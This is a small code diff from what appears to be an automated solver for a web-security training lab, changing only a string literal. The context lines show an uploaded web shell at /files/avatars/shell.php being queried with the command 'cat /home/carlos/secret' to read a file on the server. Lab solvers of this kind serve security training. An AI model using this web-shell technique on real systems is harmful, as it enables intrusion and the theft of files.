@@ -13,7 +13,7 @@ def solve_lab(session):
     logger.info(files)
 
     params = {"cmd": "cat /home/carlos/secret"}
-    resp = session.get_path(f"/files/avatars/shell.php", params=params)
+    resp = session.get_path("/files/avatars/shell.php", params=params)
     logger.info(
         f'Got the following response from visiting "/files/avatars/shell.php?{urlencode(params)}"'
     )
